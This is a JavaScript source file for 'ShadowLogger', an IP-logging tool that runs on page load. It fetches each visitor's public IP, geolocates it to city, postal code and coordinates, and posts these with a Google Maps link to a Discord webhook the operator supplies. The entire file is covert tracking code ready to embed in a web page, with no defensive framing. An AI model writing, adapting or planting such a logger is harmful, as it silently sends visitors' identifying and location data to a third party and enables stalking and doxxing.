const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = ''; // place discord webhook here
                    
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "ShadowLogger", // changeable
                            avatar_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/ShadowLogger%20pfp.png", // changeable
                            content: "@everyone",
                            embeds: [
                                {
                                    title: "📡 New Visitor Logged",
                                    color: 0x800080,
                                    fields: [
                                        {
                                            name: "🧠 IP Address",
                                            value: `${ipadd}`,
                                            inline: true
                                        },
                                        {
                                            name: "🌍 Location",
                                            value: `**City:** ${geoData.city}\n**Region:** ${geoData.region}\n**Country:** ${geoData.country_name}`,
                                            inline: true
                                        },
                                        {
                                            name: "📮 Postal & Coords",
                                            value: `**Postal Code:** ${geoData.postal}\n**Latitude:** ${geoData.latitude}\n**Longitude:** ${geoData.longitude}`
                                        },
                                        {
                                            name: "🗺️ Google Maps",
                                            value: `[📍 View Location](https://www.google.com/maps?q=${geoData.latitude},${geoData.longitude})`
                                        }
                                    ],
                                    thumbnail: {
                                        url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/ShadowLogger%20pfp.png" // changeable
                                    },
                                    footer: {
                                        text: "ShadowLogger by ARMed0ps",
                                        icon_url: "https://raw.githubusercontent.com/ARMed0ps/ShadowLogger/refs/heads/main/ShadowLogger%20pfp.png" // changeable
                                    },
                                    timestamp: new Date().toISOString()
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};

sendIP();
